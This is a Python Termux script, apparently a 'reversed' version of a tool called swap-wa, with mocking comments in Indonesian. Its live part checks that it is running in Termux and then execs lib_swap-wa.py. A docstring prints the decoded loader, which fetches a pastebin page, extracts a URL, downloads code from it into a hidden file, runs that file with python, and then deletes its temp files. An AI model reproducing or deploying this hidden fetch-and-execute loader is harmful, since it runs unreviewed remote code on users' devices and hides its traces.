# Reversed by Exotic-Hridoy
# If you think you deserve this tool , then take it.
# Tool Author :  https://youtube.com/@freetutorialofficial
# Original repository https://github.com/

sxp_termux = ('''#!/data/data/com.termux/files/usr/bin/bash

: Creator : Sanz
: Youtube : FREE TUTORIAL
: Github  : https://github.com/Sxp-ID
: Note    : Recode mulu kak! Skill sampah lu awokawok :v

x=$(grep -o "com.termux" <<< "$(pwd)" > .__sanz_xd__)
''')
try:
	open(".__sanz_ganz__","w").write(sxp_termux)
except:
	__import__("os").system("rm .__sanz_ganz__ &> /dev/null")
	__import__("sys").exit()

try:
	__import__("os").system("bash .__sanz_ganz__")
except:
	__import__("os").system("rm .__sanz_ganz__ .__sanz_xd__ &> /dev/null")
	__import__("sys").exit()
try:
	yo = open(".__sanz_xd__","r").read().split()[0]
	if yo == "com.termux":
		__import__("os").system("rm .__sanz_ganz__ .__sanz_xd__ &> /dev/null")
		pass
	else:
		print("\n\033[1;37m[\033[1;31m!\033[1;37m] Harus Menggunakan Aplikasi Termux Ngab\033[1;31m..\n")
		__import__("os").system("rm .__sanz_ganz__ .__sanz_xd__ &> /dev/null")
		__import__("sys").exit()
except:
	print("\n\033[1;37m[\033[1;31m!\033[1;37m] Harus Menggunakan Aplikasi Termux Ngab\033[1;31m..\n")
	__import__("os").system("rm .__sanz_ganz__ .__sanz_xd__ &> /dev/null")
	__import__("sys").exit()

file_a = ".__sanz__"
file_b = ".__sanz_xd__"
file_c = ".__sanz_ganz__"

def hapus_file(sg):
	file = f"{sg}"
	if __import__("os").path.isfile(sg):
		__import__("os").remove(file)
	else:
		pass

def hapus():
	try:
		hapus_file(file_a);hapus_file(file_b);hapus_file(file_c)
	except:
		pass

m = "\033[1;31m"
k = "\033[1;33m"
p = "\033[1;37m"
sxp = "https://pastebin.com/raw/FxZzRs1P"
try:
	exec(open('lib_swap-wa.py','rb').read(),globals())
	"""
	import os, random, sys, json
	try:
		import requests, bs4, fake_useragent, rich
	except ModuleNotFoundError:
		hapus()
		exit(
			f"\n{p}[{m}!{p}] Module Belum Terinstall, Ketik Perintah Dibawah\n{p}[{m}${p}] {k}python -m pip install -r requirements.txt\n"
	)

	from bs4 import BeautifulSoup as bs
	from fake_useragent import UserAgent as ua

	agent = ua()
	agent = agent.random

	sanz = requests.get(sxp,headers={"user-agent":agent}).text
	index = sanz.split("Url: ")[1].split("\r\n")
	url = index[0]
	__sanz__ = requests.get(url,headers={"user-agent":agent}).text
	__free_tutorial__ = open(".__sanz__","w").write(__sanz__)
	### gaskeun masbro ###
	os.system("python .__sanz__")
	"""

except KeyboardInterrupt:
	hapus()
	exit(f"\n{p}[{m}!{p}] Program Dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus()
	exit(f"\n{p}[{m}!{p}] Koneksi Internet Error\n")
except Exception as lol:
	to=f"\n{p}[{m}!{p}] Error {m}: {p}"
	hapus()
	exit(f"{to}{lol}\n")

